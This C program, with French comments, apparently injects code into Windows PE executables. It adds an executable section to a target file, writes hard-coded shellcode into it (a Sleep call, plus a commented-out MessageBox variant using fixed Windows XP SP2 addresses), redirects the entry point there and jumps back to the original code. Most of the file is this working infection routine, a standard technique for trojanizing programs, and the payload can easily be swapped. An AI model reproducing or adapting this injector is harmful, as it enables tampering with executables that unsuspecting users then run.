#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define USAGE "usage : ./%s <file>.\r\n"

long AligneSur(long alignement,long valeur);

int main(int argc , char* argv[])
{
    /* merci à baboon pour la modif du shellcode :) */
	/*
	char shellcode[]=
     "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
     "\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
     "\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
     "\xa0\xad\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
     "\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
     "\x51\x52\xff\xd0\xeb\x35\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
     "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
     "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
     "\xff\x2E\x30\x76\x65\x72\x2E\x4e"
     "\xE9"; // notre jump !
*/

char shellcode[] =
// page 608 doc Intel
/*Sleep(5000)*/
//sleep V2 sqns 0
"\x33\xc0"          		// XOR EAX,EAX
"\x66\xb8\x37\x13"     		//MOV AX,1337
"\x50"             			//PUSH EAX   
"\xb8\x42\x24\x80\x7c" 	// mov eax, 7c802442h
"\xff\xd0" 				//far call eax



/*Jmp Previous entry Point*/
//"\xb8\x30\x11\x40\x00"       // mov eax,<START>  
 //"\xff\xe0" // jmp near eax
"\xe9"
;

    long tailleSection = strlen(shellcode) + 0 + (sizeof(DWORD)); //notre dword sur lequel nous allons sauter, le veritable entry point.

        if(!argv[1])
	{
	printf(USAGE, argv[0]);
	return 1;
	}

    PIMAGE_DOS_HEADER infosExecutable;
    PIMAGE_NT_HEADERS infosPE;

	// CreateFile -> http://msdn2.microsoft.com/en-us/library/aa363858.aspx

	HANDLE executableHandle = CreateFile(argv[1] , GENERIC_READ | GENERIC_WRITE , FILE_SHARE_READ | FILE_SHARE_WRITE , NULL ,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,	NULL) ; 
	// CreateFileMapping http://msdn.microsoft.com/en-us/library/aa366537(VS.85).aspx

	HANDLE executableMappe = CreateFileMapping(executableHandle , NULL , PAGE_READWRITE , 0  , 0 , NULL) ; 

	
	LPVOID executableEnMemoire = MapViewOfFile(executableMappe , FILE_MAP_ALL_ACCESS , 0 ,  0, 0); 

    if (executableHandle == INVALID_HANDLE_VALUE || executableMappe == INVALID_HANDLE_VALUE || executableEnMemoire == INVALID_HANDLE_VALUE)
	    return 1;
printf("Sizeof(IMAGE_DOS_HEADER) %i \r\n", sizeof(IMAGE_DOS_HEADER));
printf("Sizeof(IMAGE_NT_HEADERS) %i \r\n", sizeof(IMAGE_NT_HEADERS));
printf("Sizeof(IMAGE_FILE_HEADER) %i \r\n", sizeof(IMAGE_FILE_HEADER));
printf("Sizeof(IMAGE_OPTIONAL_HEADER) %i \r\n", sizeof(IMAGE_OPTIONAL_HEADER));
printf("Sizeof(IMAGE_SECTION_HEADER) %i \r\n", sizeof(IMAGE_SECTION_HEADER));

infosExecutable = (PIMAGE_DOS_HEADER)executableEnMemoire;
	printf(" &PIMAGE_DOS_HEADERS: %p \r\n", &infosExecutable);
	printf(" PIMAGE_DOS_HEADERS: %p \r\n", infosExecutable);
	printf(" *PIMAGE_DOS_HEADERS: %p \r\n", *infosExecutable);
    if (infosExecutable->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("[!] Il ne s'agit pas d'un binaire au format PE.\n");
        return 1;
    }

    printf("[~] Ownage du PE en cours.\n");

    infosPE = (PIMAGE_NT_HEADERS)((PUCHAR)infosExecutable + infosExecutable->e_lfanew);

    if(infosPE->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] La signature PE est corrompu.\n");
        return 1;
    }

    PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
    PWORD pointeurNombreDeSection = &infosPE->FileHeader.NumberOfSections;
    PDWORD pointeurSizeOfImage = &infosPE->OptionalHeader.SizeOfImage;
    DWORD sectionAlignment = infosPE->OptionalHeader.SectionAlignment;
    DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
    DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;

    

  

    printf("& PIMAGE_NT_HEADERS: %p  \r\n", &infosPE);
    printf("IMAGE_NT_HEADERS: %p  \r\n", infosPE);
    printf(" *PIMAGE_NT_HEADERS: %p  \r\n", *infosPE);
    
    //addr infosPe (IMAGE_NT_HEADERS) + sizeof (IMAGE_NT_HEADERS) pointe sur le 1er section_header
    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS)); 

    printf(" &PIMAGE_SECTION_HEADER : %p,   \r\n", &infosSection);
     printf(" PIMAGE_SECTION_HEADER : %p,   \r\n", infosSection);
    printf("*PIMAGE_SECTION_HEADER : %p \r\n", *infosSection);

    // infosSection += numbersection * sizeof(image_section_header) pointe sur la fin des sections header 
    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
    printf("Nombre de sections : %i \r\n", infosPE->FileHeader.NumberOfSections);

    printf("&PIMAGE new section HEADER : %p \r\n", &infosSection);
    printf("PIMAGE new section HEADER : %p \r\n", infosSection);
    printf("  *PIMAGE NEW SECTION HEADER : %p \r\n", *infosSection);

// pointe sur le nouvel section header
    PIMAGE_SECTION_HEADER notreSection = (PIMAGE_SECTION_HEADER)(infosSection);

    //On retrouve l'addr de l'entete précédente pour calculer la vsize et voffset.
    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); 
printf("Entete precedente : %p \r\n", infosSection);
printf("Entete precedente : %p \r\n", *infosSection);
	

    (*pointeurNombreDeSection)++;
  
  printf("pointeurSizeOfImage : %p, SizeofImage : %i \r\n", pointeurSizeOfImage, *pointeurSizeOfImage);
  printf("tailleSection : %i \r\n", tailleSection);
(*pointeurSizeOfImage) += tailleSection;

  printf("new sizeofImage  : %i \r\n", *pointeurSizeOfImage);

    char* nomSection = ".newsec"; //7char + \0 => tjrs 8chars.

    strcpy((char*)notreSection->Name,nomSection);
    notreSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
    printf("ici-------------\r\n\r\n");
    printf("newSection->Misc.VirtualSize %p \r\n", notreSection->Misc.VirtualSize);
    printf("infosSection->Misc.VirtualAdress %p \r\n", infosSection->VirtualAddress);
    printf("sectionAlignment %x \r\n", sectionAlignment);
    notreSection->VirtualAddress = AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
    printf("newSection->Misc.VirtualAdress %p \r\n", notreSection->VirtualAddress);

    notreSection->SizeOfRawData = AligneSur(fileAlignment,tailleSection);
    notreSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
    notreSection->PointerToRelocations = 0;
    notreSection->PointerToLinenumbers = 0;
    notreSection->NumberOfRelocations = 0;
    notreSection->NumberOfLinenumbers = 0;
    notreSection->Characteristics = IMAGE_SCN_MEM_READ + IMAGE_SCN_MEM_WRITE + IMAGE_SCN_MEM_EXECUTE;

    *ptrEntryPoint = notreSection->VirtualAddress;

    long fakeEP = notreSection->VirtualAddress;
    long pointerToRaw = notreSection->PointerToRawData;
    DWORD decallage = sauvegardeEntryPoint - ( (fakeEP + tailleSection) );
   printf("Decalage %i -- %p = sauvegarde entrypoint %p - (fakeEp %p + tailleSection %i) \r\n", decallage, decallage, sauvegardeEntryPoint, fakeEP, tailleSection);
    DWORD taille;
    long differenceDeTaille = (AligneSur(fileAlignment,tailleSection) - tailleSection);
printf("Difference de taille:  %i \r\n", differenceDeTaille);

printf(" executableen memoire %p \r\n", executableEnMemoire);

    UnmapViewOfFile(executableEnMemoire);
    printf("executableHandle %p \r\n", executableHandle);
        CloseHandle(executableHandle);
    printf("executableMappe %p \r\n", executableMappe);

CloseHandle(executableMappe);

    printf("filename %s, param2 %i, param3 %i, param4 %i, param5 %i, param6 %i, param7 %i \r\n", argv[1], GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
    printf("INVALID HANDLE_VALUE == %i \r\n", INVALID_HANDLE_VALUE);


HANDLE fp = CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
    if (fp == INVALID_HANDLE_VALUE)
    {
	    printf("createFIle INVALID_HANDLE_VALUE \r\n");
	    printf("Error Code : %i \r\n", GetLastError());
    }
   SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);

    WriteFile(fp,shellcode,(strlen(shellcode) + 0),&taille,NULL);//on écrit notre shellcode.
    WriteFile(fp,&decallage,sizeof(DWORD),&taille,NULL);// notre adresse sur laquel jump !
    printf("&decallage %p \n", &decallage);
	int i;
    for (i =  0; i < differenceDeTaille ; i++)
	{
		WriteFile(fp,"\x90",1,&taille,NULL);
  	}		
	//on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information.
	CloseHandle(fp);
	return 0;
}

long AligneSur(long alignement,long valeur)
{
    if( (valeur%alignement) == 0)
    {
        return valeur;		
    }	
    long quotient = (valeur/alignement);
    return ((quotient + 1) * ( alignement ));
}	
	

